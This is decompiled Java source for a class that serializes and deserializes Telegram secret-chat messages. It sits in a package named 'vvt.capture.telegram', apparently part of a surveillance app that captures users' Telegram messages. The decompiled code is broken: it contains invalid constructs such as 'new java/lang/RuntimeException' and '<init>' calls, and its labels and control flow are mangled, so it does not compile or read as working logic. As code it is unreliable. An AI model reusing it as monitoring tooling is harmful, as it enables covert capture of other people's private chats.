package com.vvt.capture.telegram.internal;

import java.util.ArrayList;

public class TLRPC$TL_message_secret
  extends TLRPC.TL_message
{
  public static int constructor = 1431655929;
  
  public void readParams(AbstractSerializedData paramAbstractSerializedData, boolean paramBoolean)
  {
    int i = 1;
    int j = 0;
    int k = paramAbstractSerializedData.readInt32(paramBoolean);
    this.flags = k;
    k = this.flags & 0x1;
    if (k != 0)
    {
      k = i;
      this.unread = k;
      k = this.flags & 0x2;
      if (k == 0) {
        break label291;
      }
      k = i;
      label56:
      this.out = k;
      k = this.flags & 0x10;
      if (k == 0) {
        break label300;
      }
      k = i;
      label79:
      this.mentioned = k;
      k = this.flags & 0x20;
      if (k == 0) {
        break label309;
      }
      k = i;
    }
    Object localObject1;
    Object localObject2;
    Object localObject3;
    for (;;)
    {
      this.media_unread = k;
      k = paramAbstractSerializedData.readInt32(paramBoolean);
      this.id = k;
      k = paramAbstractSerializedData.readInt32(paramBoolean);
      this.ttl = k;
      k = paramAbstractSerializedData.readInt32(paramBoolean);
      this.from_id = k;
      k = paramAbstractSerializedData.readInt32(paramBoolean);
      localObject1 = TLRPC.Peer.TLdeserialize(paramAbstractSerializedData, k, paramBoolean);
      this.to_id = ((TLRPC.Peer)localObject1);
      k = paramAbstractSerializedData.readInt32(paramBoolean);
      this.date = k;
      localObject1 = paramAbstractSerializedData.readString(paramBoolean);
      this.message = ((String)localObject1);
      k = paramAbstractSerializedData.readInt32(paramBoolean);
      localObject1 = TLRPC.MessageMedia.TLdeserialize(paramAbstractSerializedData, k, paramBoolean);
      this.media = ((TLRPC.MessageMedia)localObject1);
      k = paramAbstractSerializedData.readInt32(paramBoolean);
      int n = 481674261;
      if (k == n) {
        break label318;
      }
      if (!paramBoolean) {
        break label351;
      }
      localObject2 = new java/lang/RuntimeException;
      localObject3 = new Object[i];
      localObject1 = Integer.valueOf(k);
      localObject3[0] = localObject1;
      localObject1 = String.format("wrong Vector magic, got %x", (Object[])localObject3);
      ((RuntimeException)localObject2).<init>((String)localObject1);
      throw ((Throwable)localObject2);
      k = 0;
      localObject1 = null;
      break;
      label291:
      k = 0;
      localObject1 = null;
      break label56;
      label300:
      k = 0;
      localObject1 = null;
      break label79;
      label309:
      k = 0;
      localObject1 = null;
    }
    label318:
    k = paramAbstractSerializedData.readInt32(paramBoolean);
    if (j < k)
    {
      i = paramAbstractSerializedData.readInt32(paramBoolean);
      localObject3 = TLRPC.MessageEntity.TLdeserialize(paramAbstractSerializedData, i, paramBoolean);
      if (localObject3 != null) {}
    }
    for (;;)
    {
      label351:
      return;
      localObject2 = this.entities;
      ((ArrayList)localObject2).add(localObject3);
      j += 1;
      break;
      k = this.flags & 0x800;
      if (k != 0)
      {
        localObject1 = paramAbstractSerializedData.readString(paramBoolean);
        this.via_bot_name = ((String)localObject1);
      }
      k = this.flags & 0x8;
      if (k != 0)
      {
        long l = paramAbstractSerializedData.readInt64(paramBoolean);
        this.reply_to_random_id = l;
      }
      k = this.id;
      if (k >= 0)
      {
        localObject1 = this.media;
        if (localObject1 != null)
        {
          localObject1 = this.media;
          boolean bool1 = localObject1 instanceof TLRPC.TL_messageMediaEmpty;
          if (!bool1)
          {
            localObject1 = this.media;
            bool1 = localObject1 instanceof TLRPC.TL_messageMediaWebPage;
            if (!bool1)
            {
              localObject1 = this.message;
              if (localObject1 != null)
              {
                localObject1 = this.message;
                int m = ((String)localObject1).length();
                if (m != 0)
                {
                  localObject1 = this.message;
                  localObject3 = "-1";
                  boolean bool2 = ((String)localObject1).startsWith((String)localObject3);
                  if (!bool2) {}
                }
              }
            }
          }
        }
      }
      else
      {
        localObject1 = paramAbstractSerializedData.readString(paramBoolean);
        this.attachPath = ((String)localObject1);
      }
    }
  }
  
  public void serializeToStream(AbstractSerializedData paramAbstractSerializedData)
  {
    int i = constructor;
    paramAbstractSerializedData.writeInt32(i);
    boolean bool1 = this.unread;
    if (bool1)
    {
      int j = this.flags | 0x1;
      this.flags = j;
      boolean bool2 = this.out;
      if (!bool2) {
        break label246;
      }
      int k = this.flags | 0x2;
      label46:
      this.flags = k;
      boolean bool3 = this.mentioned;
      if (!bool3) {
        break label257;
      }
      int m = this.flags | 0x10;
      label68:
      this.flags = m;
      boolean bool4 = this.media_unread;
      if (!bool4) {
        break label268;
      }
    }
    label246:
    label257:
    label268:
    for (int n = this.flags | 0x20;; n = this.flags & 0xFFFFFFDF)
    {
      this.flags = n;
      n = this.flags;
      paramAbstractSerializedData.writeInt32(n);
      n = this.id;
      paramAbstractSerializedData.writeInt32(n);
      n = this.ttl;
      paramAbstractSerializedData.writeInt32(n);
      n = this.from_id;
      paramAbstractSerializedData.writeInt32(n);
      this.to_id.serializeToStream(paramAbstractSerializedData);
      n = this.date;
      paramAbstractSerializedData.writeInt32(n);
      localObject = this.message;
      paramAbstractSerializedData.writeString((String)localObject);
      this.media.serializeToStream(paramAbstractSerializedData);
      paramAbstractSerializedData.writeInt32(481674261);
      int i1 = this.entities.size();
      paramAbstractSerializedData.writeInt32(i1);
      n = 0;
      localObject = null;
      for (int i2 = 0; i2 < i1; i2 = n)
      {
        localObject = (TLRPC.MessageEntity)this.entities.get(i2);
        ((TLRPC.MessageEntity)localObject).serializeToStream(paramAbstractSerializedData);
        n = i2 + 1;
      }
      n = this.flags & 0xFFFFFFFE;
      break;
      n = this.flags & 0xFFFFFFFD;
      break label46;
      n = this.flags & 0xFFFFFFEF;
      break label68;
    }
    n = this.flags & 0x800;
    if (n != 0)
    {
      localObject = this.via_bot_name;
      paramAbstractSerializedData.writeString((String)localObject);
    }
    n = this.flags & 0x8;
    if (n != 0)
    {
      long l = this.reply_to_random_id;
      paramAbstractSerializedData.writeInt64(l);
    }
    Object localObject = this.attachPath;
    paramAbstractSerializedData.writeString((String)localObject);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/telegram/internal/TLRPC$TL_message_secret.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */